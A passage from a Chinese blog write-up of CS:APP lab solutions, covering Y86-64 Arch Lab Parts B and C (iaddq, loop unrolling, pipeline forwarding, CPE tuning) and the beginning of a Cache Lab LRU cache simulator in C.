src,%rdi<br>    irmovq dest,%rsi<br>    irmovq $3,%rdx<br>    call   copy<br>    ret<br>copy:<br>    xorq   %rax,%rax<br>    irmovq $8,%r8<br>    irmovq $1,%r9<br>    andq   %rdx,%rdx<br>    jmp    test<br>loop:<br>    mrmovq (%rdi),%rcx<br>    rmmovq %rcx,(%rsi)<br>    addq   %r8,%rdi<br>    addq   %r8,%rsi<br>    xorq   %rcx,%rax<br>    subq   %r9,%rdx<br>test:<br>    jne    loop<br>    ret<br><br>#stack starts here and grows to lower address<br>    .pos   0x200<br>stack:<br><br></code></pre></td></tr></table></figure><h3 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h3><p>在<code>seq-full.hcl</code>中，为SEQ处理器添加<code>iaddq</code>指令，格式如下。</p><p><img src="/CSAPP3e_WP/image-20240130103617334-172450354200723.png" alt="image-20240130103617334" style="zoom:80%;" align="left"></p><p>完成本部分的要点：</p><p>·<code>iaddq</code>指令需要寄存器rB，需要regid byte并指定B source和E destination为rB，valB也是aluB输入</p><p>·<code>iaddq</code>指令需要立即数valC，是aluA输入</p><p>·<code>iaddq</code>指令需要更新条件码</p><p>本部分需要的改动如下，一共8处：</p><p><img src="/CSAPP3e_WP/image-20240130104635910-172450354535525.png" alt="image-20240130104635910" style="zoom: 50%;" align="left"></p>    <p><img src="/CSAPP3e_WP/image-20240130104730781-172450354929327.png" alt="image-20240130104730781" style="zoom: 60%;" align="left"></p>    <p><img src="/CSAPP3e_WP/image-20240130104906410-172450356093629.png" alt="image-20240130104906410" style="zoom: 55%;" align="left"></p>    <p><img src="/CSAPP3e_WP/image-20240130104938970-172450356436831.png" alt="image-20240130104938970" style="zoom:51%;" align="left"></p><h3 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h3><p>先仿照Part B添加<code>iaddq</code>指令，对初始状态的PIPE处理器和<code>ncopy.ys</code>程序执行基准测试<code>benchmark.pl</code>，CPE为15.18。</p><h4 id="1-指令条数优化"><a href="#1-指令条数优化" class="headerlink" title="1.指令条数优化"></a>1.指令条数优化</h4><p>利用实现的<code>iaddq</code>指令减少指令数，同时利用减法的条件码直接判断<code>len</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># You can modify this portion<br># Loop header<br>    xorq %rax,%rax# count = 0;<br>andq %rdx,%rdx# len &lt;= 0?<br>jle Done# if so, goto Done:<br>Loop:<br>mrmovq (%rdi), %rbp# read val from src...<br>rmmovq %rbp, (%rsi)# ...and store it to dst<br>andq %rbp, %rbp# val &lt;= 0?<br>jle Npos# if so, goto Npos:<br>iaddq $1, %rax# count++<br>Npos:<br>iaddq $8, %rdi# src++<br>iaddq $8, %rsi# dst++<br>iaddq $-1, %rdx# len--<br>jg Loop# if len &gt; 0, goto Loop:<br></code></pre></td></tr></table></figure><p>此操作大幅减少了CPE至11.70。</p><h4 id="2-循环展开"><a href="#2-循环展开" class="headerlink" title="2.循环展开"></a>2.循环展开</h4><p>%rax, %rdi, %rsi, %rdx, %rsp不能使用，可以使用剩下10个寄存器，并且由于1000字节的代码长度限制，循环展开不超过10路是比较可行的。</p><p>考虑循环展开n路，余下部分逐个循环读入，因此n较大时CPE会受到剩余数据的影响，在后续阶段处理这个问题。选取部分数值测试CPE如下：</p><table><thead><tr><th>n</th><th>1</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th></tr></thead><tbody><tr><td>CPE</td><td>11.70</td><td>8.59</td><td>8.57</td><td>8.60</td><td>8.64</td><td>8.69</td><td>8.74</td></tr></tbody></table><p>此处取n&#x3D;6；同时发现去除第一条指令仍能通过正确性测试，修改代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># You can modify this portion<br># Loop header<br># init: count = 0;<br>iaddq $-6,%rdx# len &lt;= 6?<br>jle  Base# if so, goto Base:<br>Loop:<br># read val from src...<br>mrmovq   (%rdi), %rbp<br>mrmovq  $8(%rdi), %rbx<br>mrmovq $16(%rdi), %rcx<br>mrmovq $24(%rdi), %r8<br>mrmovq $32(%rdi), %r9<br>mrmovq $40(%rdi), %r10<br>val1:<br>rmmovq %rbp, (%rsi)# ...and store it to dst<br>andq   %rbp, %rbp# val &lt;= 0?<br>jle    val2# if so, goto val2:<br>iaddq  $1, %rax# count++<br>val2: # omitted<br>val3: # omitted<br>val4: # omitted<br>val5: # omitted<br>val6:<br>rmmovq %r10, $40(%rsi)<br>andq   %r10, %r10<br>jle    Next<br>iaddq  $1, %rax<br>Next:<br>iaddq $48, %rdi# src+=6<br>iaddq $48, %rsi# dst+=6<br>iaddq $-6, %rdx# len-=6<br>jg  Loop# if len &gt; 0, goto Loop:<br>Base:<br>iaddq $6, %rdx# len+=6<br>je  Done# if zero, goto Done:<br>BLoop:<br>mrmovq (%rdi), %rbx# read val from src...<br>andq %rbx, %rbx# val &lt;= 0?<br>rmmovq %rbx, (%rsi)# ...and store it to dst<br>jle BNpos# if so, goto BNpos:<br>iaddq $1, %rax# count++<br>BNpos:<br>iaddq $8, %rdi# src++<br>iaddq $8, %rsi# dst++<br>iaddq $-1, %rdx# len--<br>jg BLoop# if len &gt; 0, goto BLoop:<br></code></pre></td></tr></table></figure><p>经过第2步优化的CPE为8.50。</p><h4 id="3-条件跳转优化"><a href="#3-条件跳转优化" class="headerlink" title="3.条件跳转优化"></a>3.条件跳转优化</h4><p>使用一个条件可以执行<code>jl</code>,<code>je</code>,<code>jg</code>三种跳转，把不多于6个数的查找(Base分支)转化为二叉查找树，根为3，分支点为3,1,5，其中评判权重大的分支更靠前（优先级排序为1&gt;2&gt;0, 4&gt;5&gt;6），改写Base分支如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Base:<br>iaddq $6, %rdx# len+=6<br>je  Done# if zero, goto Done:<br><br>iaddq $-3, %rdx<br>jl  BR1<br>jgBR5<br>jmpIncl3<br>BR1:<br>    iaddq $2, %rdx<br>    je copy1<br>    jg copy2<br>    jmp Done<br>BR5:<br>    iaddq $-2, %rdx<br>jl copy4<br>    je copy5<br>    jmp copy6<br><br>copy6:<br>    mrmovq $40(%rdi), %r10 # read val from src...<br>    andq %r10, %r10 # val &lt;= 0?<br>    rmmovq %r10, $40(%rsi) # ...and store it to dst<br>    jle copy5<br>    iaddq $1, %rax <br>copy5: # omitted<br>copy4: # omitted<br>copy3: # omitted<br>copy2: # omitted<br>copy1: # omitted<br></code></pre></td></tr></table></figure><p>CPE为8.04。</p><p>如果调整主循环的边界条件，将len为6的条件置入主循环中则效率更高：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># You can modify this portion<br># Loop header<br># init: count = 0;<br>iaddq $-6,%rdx# len &lt; 6?<br>jl  Base# if so, goto Base:<br>Loop: # unchanged<br>Next:<br>iaddq $48, %rdi# src+=6<br>iaddq $48, %rsi# dst+=6<br>iaddq $-6, %rdx# len-=6<br>jge  Loop# if len &gt;= 0, goto Loop:<br>Base:<br>iaddq $6, %rdx# len+=6<br>je  Done# if zero, goto Done:<br># omitted<br>BR5:<br>    iaddq $-2, %rdx<br>jl copy4<br>    jmp copy5<br>copy6: # unused<br>copy5: # unchanged<br></code></pre></td></tr></table></figure><p>此时的CPE仍有提升，为7.92。</p><p>为了将查找树最后一层填满，可以利用copy6并将循环展开至7路，CPE小幅减少，此时程序大致结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># You can modify this portion<br># Loop header<br># init: count = 0;<br>iaddq $-7,%rdx# len &lt; 7?<br>jl   Base# if so, goto Base:<br>Loop:<br># read val from src...<br>mrmovq   (%rdi), %rbp<br>mrmovq  $8(%rdi), %rbx<br>mrmovq $16(%rdi), %rcx<br>mrmovq $24(%rdi), %r8<br>mrmovq $32(%rdi), %r9<br>mrmovq $40(%rdi), %r10<br>mrmovq $48(%rdi), %r11<br>val1: # unchanged<br>val2: # unchanged<br>val3: # unchanged<br>val4: # unchanged<br>val5: # unchanged<br>val6: # omitted<br>val7: <br>andq   %r11, %r11<br>rmmovq %r11, $48(%rsi)<br>jle    Next<br>iaddq  $1, %rax<br>Next:<br>iaddq $56, %rdi# src+=7<br>iaddq $56, %rsi# dst+=7<br>iaddq $-7, %rdx# len-=7<br>jge  Loop# if len &gt;= 0, goto Loop:<br>Base:<br>iaddq $7, %rdx# len+=7<br>je  Done# if zero, goto Done:<br>BR3: # unchanged<br>BR1: # unchanged<br>BR5:<br>iaddq $-2, %rdx<br>jl copy4<br>je copy5<br>copy6:<br>    mrmovq $40(%rdi), %r10 <br>andq %r10, %r10 <br>    rmmovq %r10, $40(%rsi) <br>    jle copy5<br>    iaddq $1, %rax <br>copy5: # unchanged<br>copy4: # unchanged<br>copy3: # unchanged<br>copy2: # unchanged<br>copy1: # unchanged<br></code></pre></td></tr></table></figure><p>第3步优化结束，CPE&#x3D;7.88。</p><h4 id="4-数据旁路"><a href="#4-数据旁路" class="headerlink" title="4.数据旁路"></a>4.数据旁路</h4><p><code>mrmovq</code>和<code>rmmovq</code>之间的<code>andq</code>指令判断当前取出的数据，需要为valA添加数据旁路，对<code>pipe-full.hcl</code>作以下改动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 替换以下表达式：<br>   word e_valA = E_valA;    # Pass valA through stage <br># 改为：<br>   word e_valA = [<br>E_icode in &#123; IRMMOVQ, IPUSHQ &#125; &amp;&amp; E_srcA == M_dstM :m_valM;   # valA bypass<br>1   :E_valA;    # Pass valA through stage<br>   ];<br></code></pre></td></tr></table></figure><p>改动完成后可以删除流水线中相应的暂停和空泡，修改方式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># 替换以下表达式：<br>    E_dstM in &#123; d_srcA, d_srcB &#125;<br># 改为：<br>    ( E_dstM ==  d_srcB || E_dstM == d_srcA &amp;&amp;  !D_icode in &#123; IRMMOVQ, IPUSHQ &#125; )<br></code></pre></td></tr></table></figure><p>添加数据旁路后，可以将全部<code>rmmovq</code>指令提前，程序中也减少了顺序限制，CPE减至7.69。</p><p>重新考虑循环展开，经测试，如果循环展开成9路，并且查找树改为下图所示，则CPE优化到7.68：</p><p><img src="/CSAPP3e_WP/image-20240131144006809-172450356875933.png" alt="image-20240131144006809" style="zoom:67%;" align="left"></p><p>此时发现查找树中已经包含了0，似乎取消在Base情况中特判0可以提高效率，修改此部分代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Base:<br>    iaddq $6,%rdx# start with root=3<br>    jl BR1<br>    jg BR5<br>    jmp copy3<br>BR1:<br>    iaddq $2,%rdx<br>    je copy1<br>    jg copy2<br>    ret         <br>BR5:<br>    iaddq $-2,%rdx<br>    jl copy4<br>    je copy5<br>BR7:<br>    iaddq $-2,%rdx<br>    jl copy6<br>je copy7<br>copy8:<br>    mrmovq $56(%rdi), %r12 <br>    rmmovq %r12, $56(%rsi) <br>andq %r12, %r12 <br>    jle copy7<br>    iaddq $1, %rax <br># omitted<br></code></pre></td></tr></table></figure><p>此时可以将CPE做到7.44，轻松满分——如果不用trick呢？</p><p>虽然此处%rax的初值为零，可以去除第一条指令，但在一般情形下，%rax的初值可能是不确定的，恢复在第2步中被删除的<code>xorq %rax, %rax</code>指令，重新运行测试，CPE&#x3D;7.51。</p><h4 id="5-参数修正与最终优化结果"><a href="#5-参数修正与最终优化结果" class="headerlink" title="5.参数修正与最终优化结果"></a>5.参数修正与最终优化结果</h4><p>6所在节点太深，可能需要调整查找树的结构；1,2,3对CPE影响大，故左子树和根不更改。尝试修改如下：</p><p><img src="/CSAPP3e_WP/image-20240131165552508-172450357635835.png" alt="image-20240131165552508" style="zoom: 67%;" align="left"></p><p>修改Base的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Base:<br>    iaddq $6,%rdx# start with root=3<br>    jl BR1<br>    jg BR6<br>    jmp copy3<br>BR1:<br>    iaddq $2,%rdx<br>    je copy1<br>    jg copy2<br>    ret <br>BR5:<br>iaddq $1,%rdx<br>    jl copy4<br>    je copy5<br>BR6:<br>    iaddq $-3,%rdx<br>    jl BR5<br>    je copy6<br>BR7:<br>    iaddq $-2,%rdx<br>    jl copy7<br>copy8:<br>    mrmovq $56(%rdi), %r12 <br>    rmmovq %r12, $56(%rsi) <br>andq %r12, %r12 <br>    jle copy7<br>    iaddq $1, %rax <br># omitted<br></code></pre></td></tr></table></figure><p>修改后在基准测试中CPE&#x3D;7.49。</p><h2 id="5a-Cache-Lab-缓存宝贵，不能浪费"><a href="#5a-Cache-Lab-缓存宝贵，不能浪费" class="headerlink" title="5a. Cache Lab:  缓存宝贵，不能浪费"></a>5a. Cache Lab:  缓存宝贵，不能浪费</h2><h3 id="Part-A-1"><a href="#Part-A-1" class="headerlink" title="Part A"></a>Part A</h3><p>完成cache模拟器，输入Valgrind memory trace文件，输出hit, miss, eviction的总数。因此缓存模拟器只要精确到缓存行的行为即可，置换算法使用LRU。</p><p>定义全局变量——缓存参数、计数器、LRU算法计时器、缓存行结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>     set_bit = <span class="hljs-number">0</span>, offset_bit = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span>     set_cnt = <span class="hljs-number">0</span>, line_cnt = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span>     hit     = <span class="hljs-number">0</span>, miss     = <span class="hljs-number">0</span>, eviction   = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span>     global_time = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cache_line</span>&#123;</span><br>    <span class="hljs-type">int</span> valid;<br>    <span class="hljs-type">int</span> tag;<br>    <span class="hljs-type">int</span> last_used_time;         <br>&#125;line;<br></code></pre></td></tr></table></figure><p>分配和回收缓存：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">line** <span class="hljs-title function_">alloc_cache</span><span class="hljs-params">()</span>&#123;<br>    set_cnt  = <span class="hljs-number">1</span> &lt;&lt; set_bit;<br>    line** cache = (line**)<span class="hljs-built_in">calloc</span>(set_cnt,<span class="hljs-keyword">sizeof</span>(line*));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;set_cnt;i++)<br>        cache[i]=(line*)<span class="hljs-built_in">calloc</span>(line_cnt,<span class="hljs-keyword">sizeof</span>(line));<br>    <span class="hljs-keyword">return</span> cache;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">free_cache</span><span class="hljs-params">(line** cache)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;set_cnt;i++)<span class="hljs-built_in">free</span>(cache[i]);<br>    <span class="hljs-built_in">free</span>(cache);<br>&#125;<br></code></pre></td></tr></table></figure><p>解析命令行参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">info</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage: ./csim [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Options:\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  -h         Print this help message.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  -v         Optional verbose flag.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  -s &lt;num&gt;   Number of set index bits.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  -E &lt;num&gt;   Number of lines per set.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  -b &lt;num&gt;   Number of block offset bits.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  -t &lt;file&gt;  Trace file.\n\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Examples:\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  linux&gt;  ./csim -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  linux&gt;  ./csim -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span><br>&#123;<br>    <span class="hljs-type">bool</span> verbose = <span class="hljs-literal">false</span>, hint     = <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">int</span>  opt     = <span class="hljs-number">-1</span>   ;<br>    FILE *file   = <span class="hljs-literal">NULL</span> ;<br>    <span class="hljs-keyword">while</span> ( (opt = getopt(argc, argv, <span class="hljs-string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="hljs-number">-1</span> ) &#123;<br>        <span class="hljs-keyword">switch</span>(opt) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>: hint       = <span class="hljs-literal">true</span>;               <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>: verbose    = <span class="hljs-literal">true</span>;               <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>: set_bit    = atoi(optarg);       <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>: line_cnt   = atoi(optarg);       <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>: offset_bit = atoi(optarg);       <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;t&#x27;</span>: file       = fopen(optarg, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span> : info();                          <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (set_bit &lt;= <span class="hljs-number">0</span> || line_cnt &lt;= <span class="hljs-number">0</span> || offset_bit &lt;= <span class="hljs-number">0</span> || hint == <span class="hljs-literal">true</span> || file == <span class="hljs-literal">NULL</span> ) &#123;<br>        info();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    line** cache = alloc_cache();<br>    simulate(file, verbose, cache);<br>    printSummary(hit, miss, eviction);<br>    free_cache(cache);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>缓存操作，先查找，若未命中优先查找空行，最后使用LRU算法进行替换：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">cache_operation</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> mem_address, <span class="hljs-type">bool</span> verbose, line** cache)</span>&#123;<br>    <span class="hljs-type">int</span> set_index = ( mem_address &gt;&gt; offset_bit ) % set_cnt;<br>    <span class="hljs-type">int</span> line_tag  = mem_address &gt;&gt; ( offset_bit + set_bit );<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;line_cnt;i++)&#123;<br>        <span class="hljs-keyword">if</span>( cache[set_index][i].tag == line_tag &amp;&amp; cache[set_index][i].valid == <span class="hljs-number">1</span> )&#123;<br>            <span class="hljs-comment">// cache hit</span><br>            cache[set_index][i].last_used_time = global_time++;<br>            hit += <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span>(verbose)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; hit&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    miss += <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span>(verbose)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; miss&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;line_cnt;i++)&#123;<br>        <span class="hljs-keyword">if</span>( cache[set_index][i].valid == <span class="hljs-number">0</span> )&#123;       <span class="hljs-comment">// select unused line</span><br>            cache[set_index][i].valid          = <span class="hljs-number">1</span>;<br>            cache[set_index][i].tag            = line_tag;<br>            cache[set_index][i].last_used_time = global_time++;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    eviction += <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span>(verbose)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; eviction&quot;</span>);<br>    <span class="hljs-type">int</span> lru_line = <span class="hljs-number">-1</span>, lru_min = INT_MAX;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;line_cnt;i++)&#123;<br>        <span class="hljs-keyword">if</span>( cache[set_index][i].last_used_time &lt; lru_min )&#123;       <span class="hljs-comment">// select LRU line</span><br>            lru_line = i;<br>            lru_min  = cache[set_index][i].last_used_time;<br>        &#125;<br>    &#125;<br>    cache[set_index][lru_line].valid          = <span class="hljs-number">1</span>;               <span class="hljs-comment">// update LRU line</span><br>    cache[set_index][lru_line].tag            = line_tag;<br>    cache[set_index][lru_line].last_used_time = global_time++;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>解析输入文件并执行相应操作，Load&#x2F;Store各1次，Modify执行2次：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 